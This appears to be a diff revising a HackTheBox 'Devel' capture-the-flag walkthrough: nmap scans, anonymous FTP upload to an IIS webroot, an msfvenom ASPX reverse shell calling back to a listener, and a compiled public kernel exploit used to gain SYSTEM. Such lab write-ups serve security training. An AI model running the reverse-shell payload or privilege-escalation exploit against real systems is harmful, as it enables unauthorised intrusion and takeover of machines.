@@ -9,19 +9,21 @@ avatar: assets/htb/devel.png
 tags: [Remote Code Execution, Arbitrary File Upload, ASP, IIS, FTP, Enterprise Network, Protocols]
 htb_url: https://app.hackthebox.com/machines/Devel
 ---
+
 # Devel
 
 🔗 [Devel](https://app.hackthebox.com/machines/Devel)
 
-### Task 1 - Deploy the machine
+## Summary
+
+Devel is an easy Windows box running IIS 7.5 and Microsoft FTP. Anonymous FTP access maps directly to the webroot, so I uploaded an ASPX reverse shell and got code execution as the low-privileged IIS app pool account. From there an old kernel (Windows build 6.1.7600) let me escalate to `nt authority\system` with a public local privilege-escalation exploit and grab both flags.
 
 🎯 Target IP: `<YOUR_IP>`
 
-Create a directory for machine on the Desktop and a directory containing the scans with nmap.
+I set up a host entry and a working directory for scans before getting started:
 
-### Task 2 - Reconnaissance
-
-<pre class="language-bash"><code class="lang-bash">su
+```bash
+su
 echo "<YOUR_IP> devel.htb" >> /etc/hosts
 
 mkdir htb/devel.htb
@@ -29,8 +31,10 @@ cd htb/devel.htb
 
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
-<strong>sed -i '$ d' /etc/hosts
-</strong></code></pre>
+sed -i '$ d' /etc/hosts
+```
+
+## Enumeration
 
 I usually kick off recon with a ping against the target, which confirms connectivity and gives us a hint about the OS.
 
@@ -44,7 +48,9 @@ PING devel.htb (<YOUR_IP>) 56(84) bytes of data.
 
 From these three ICMP replies the Time To Live (TTL) sits around 128, which points to a Windows host, since \*nix boxes typically report a TTL of about 64.
 
-### 2.1 - What is the name of the service is running on TCP port `21` on the target machine?
+### Port scan
+
+A full TCP port sweep reveals only two open ports:
 
 ```bash
 nmap --open -p0- -n -Pn -vvv --min-rate 5000 devel.htb -oG port_scan
@@ -67,11 +73,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 127
 ```
 
-<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>
-
-The scan reveals two open ports on the box: 21 and 80.
-
-Next, let's identify the services behind those ports, paying particular attention to port 21:
+The two open ports on the box are 21 and 80. Next I ran a targeted service/version scan against them to identify what is listening, paying particular attention to FTP on port 21:
 
 ```bash
 nmap -p21,80 -n -Pn -vvv -sCV --min-rate 5000 devel.htb -oN open_ports
@@ -108,12 +110,24 @@ PORT   STATE SERVICE REASON          VERSION
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
 ```
 
-Microsoft ftpd
+The service on TCP 21 is **Microsoft ftpd**, and port 80 is **Microsoft IIS httpd 7.5**. Crucially, `ftp-anon` shows anonymous FTP login is allowed and the listing already contains a pile of `.aspx` files and `iisstart.htm` — strong indication that the FTP root is the IIS webroot.
 
-### 2.2 - Which basic FTP command can be used to upload a single file onto the server?
+The flags used in the version scan break down as follows:
+
+| command | result |
+| --- | --- |
+| sudo | run as root |
+| sC | run default scripts |
+| sV | enumerate versions |
+| A | aggressive mode |
+| T4 | run a bit faster |
+| oN | output to file with nmap formatting |
+
+### Confirming anonymous FTP and webroot mapping
+
+I logged into FTP anonymously to confirm the access and look at the available commands:
 
 ```bash
 ftp devel.htb
@@ -140,16 +154,9 @@ cd		exit		less		modtime		pls		reget		size		user
 cdup		features	lpage		more		pmlsd		remopts		sndbuf		verbose
 chmod		fget		lpwd		mput		preserve	rename		status		xferbuf
 close		form		ls		mreget		progress	reset		struct		?
-
 ```
 
-The put command lets us upload one file at a time.
-
-put
-
-### 2.3 - Are files put into the FTP root available via the webserver?<br>
-
-Let's test an upload over ftp, here pushing the nmap output file (port\_scan):
+The `put` command is what lets us upload a single file at a time. To verify the FTP root is served by the webserver, I uploaded the nmap output file (`port_scan`) and checked that it appeared in the listing:
 
 ```bash
 ftp> put port_scan 
@@ -188,61 +195,11 @@ ftp> ls
 226 Transfer complete.
 ```
 
-yes
+The file lands in the same directory the webserver serves, so anything uploaded over FTP is reachable through IIS. Since this is an IIS box, the file extension executed as a script here is **aspx** — uploading a `.aspx` file and requesting it through the webserver gives us code execution.
 
-### 2.4 - What file extension is executed as a script on this webserver? Don't include the `.`.
+## Foothold
 
-```bash
-ftp> ls
-229 Entering Extended Passive Mode (|||49220|)
-125 Data connection already open; Transfer starting.
-07-24-23  11:15AM               241062 40564.exe
-03-18-17  02:06AM       <DIR>          aspnet_client
-07-24-23  01:26AM                 1442 cmdasp.aspx
-07-24-23  12:36AM                 2914 devel.aspx
-07-24-23  01:04AM                 2886 devel1.aspx
-07-24-23  04:44PM                 2917 devel2.aspx
-07-24-23  02:11AM                 2749 develshell.aspx
-07-24-23  11:09AM                15966 fox.aspx
-07-24-23  09:26AM                 2906 hacked.aspx
-03-17-17  05:37PM                  689 iisstart.htm
-07-24-23  07:16PM                    0 killbill.aspx
-07-24-23  07:21PM                 2912 killbill1.aspx
-07-24-23  10:57PM                  464 port_scan
-07-24-23  12:17AM                 2783 pwned.aspx
-07-24-23  03:00PM                 2923 rev.aspx
-07-24-23  09:21PM                15969 shell.aspx
-07-24-23  03:34PM                73802 virus.exe
-07-24-23  12:34AM               112815 virus2.exe
-03-17-17  05:37PM               184946 welcome.png
-226 Transfer complete.
-
-```
-
-aspx
-
-### 2.5 - Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?
-
-Fire up msfconsole:
-
-```bash
-msfconsole
-```
-
-then look for a post/multi/recon module:
-
-```bash
-search post/multi/recon
-```
-
-local\_exploit\_suggester
-
-### Task 3 - Find user flag
-
-### 3.1 - Submit the flag located on the babis user's desktop.
-
-\
-At this point we can craft a payload with msfvenom and upload it through ftp:
+With the anonymous-write FTP root mapped to the IIS webroot, the path to a shell is to upload an ASPX reverse shell and execute it via the browser. I generated the payload with msfvenom, where `LHOST` is our local IP and `LPORT` is the port netcat will listen on for the callback:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f aspx > exploit.aspx
@@ -250,7 +207,7 @@ Payload size: 327 bytes
 Final size of aspx file: 2748 bytes
 ```
 
-LHOST is our local ip and LPORT is the port netcat will listen on for the callback.
+Then I uploaded it over FTP:
 
 ```bash
 ftp> put script.aspx
@@ -262,7 +219,7 @@ local: script.aspx remote: script.aspx
 2748 bytes sent in 00:00 (45.20 KiB/s)
 ```
 
-With netcat listening on port 444, we trigger the script:
+With netcat listening on port 444, I requested the script in the browser to trigger the callback and check who we are:
 
 ```bash
 c:\Windows>whoami
@@ -270,35 +227,35 @@ whoami
 iis apppool\web
 ```
 
-We landed as the iis apppool\web account, so the flag is likely under the babiis user's desktop.
-
-We can't reach babibs' directory directly, so let's hunt for "user.txt" with the where command starting at C:\ root.
+We landed as the `iis apppool\web` account. The user flag should be under the `babis` user's desktop, but we can't reach that directory directly with these low privileges. A quick search for `user.txt` from the C:\ root turns up nothing accessible yet:
 
 ```bash
 where /r C:\ user.txt
 ```
 
-No luck yet. We'll need to escalate privileges to get into bibis' directory.
+No luck — we'll need to escalate privileges first.
 
-Run systeminfo to gather details about the OS:
+## Privilege Escalation
+
+I ran `systeminfo` to gather details about the OS:
 
 ```
 systeminfo
 ```
 
+```
 OS Version: 6.1.7600 N/A Build 7600
+```
 
-A quick search turns up this [exploit](https://www.exploit-db.com/exploits/40564) matching the OS version.
+That build is old and unpatched. A quick search turns up this [exploit](https://www.exploit-db.com/exploits/40564) matching the OS version. (Metasploit's own `post/multi/recon/local_exploit_suggester` module is the standard way to enumerate these privilege-escalation paths automatically.)
 
-Grab the "40564.c" source and compile it with mingw32:
+I grabbed the `40564.c` source and compiled it with mingw32:
 
 ```bash
 i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
 ```
 
-Reconnect over ftp in binary mode and upload exploit.exe.
-
-Locate exploit.exe with the where command and execute it to escalate our privileges!
+Then I reconnected over FTP in binary mode and uploaded `exploit.exe`. From the shell, I located it with `where` and executed it to escalate:
 
 ```bash
 where /r C:\ exploit.exe
@@ -307,14 +264,14 @@ whoami
 nt authority\system
 ```
 
-Starting from the root folder (C:\\), we can quickly locate the flags using where in recursive mode (/r):
+Now running as `nt authority\system`, I can read everything. Starting from the root folder (C:\), the flags are quick to locate using `where` in recursive mode (`/r`):
 
 ```
 where /r C:\ user.txt
 C:\Users\babis\Desktop\user.txt
 ```
 
-and print the user.txt flag with the type command (the Windows equivalent of cat on \*nix):
+Printing the user.txt flag with the `type` command (the Windows equivalent of `cat` on \*nix):
 
 ```
 type C:\Users\babis\Desktop\user.txt
@@ -328,9 +285,7 @@ type C:\Users\babis\Desktop\user.txt
 
 </details>
 
-### Task 4 - Find root flag
-
-We repeat the same approach for the root.txt flag:
+The same approach gets us the root flag:
 
 ```bash
 where /r C:\ root.txt
@@ -353,17 +308,3 @@ cb43************************2f32
 
 # Agent Instructions
 This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
-
-## Querying This Documentation
-If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
-
-Perform an HTTP GET request on the current page URL with the `ask` query parameter:
-
-```
-GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/devel.md?ask=<question>
-```
-
-The question should be specific, self-contained, and written in natural language.
-The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
-
-Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
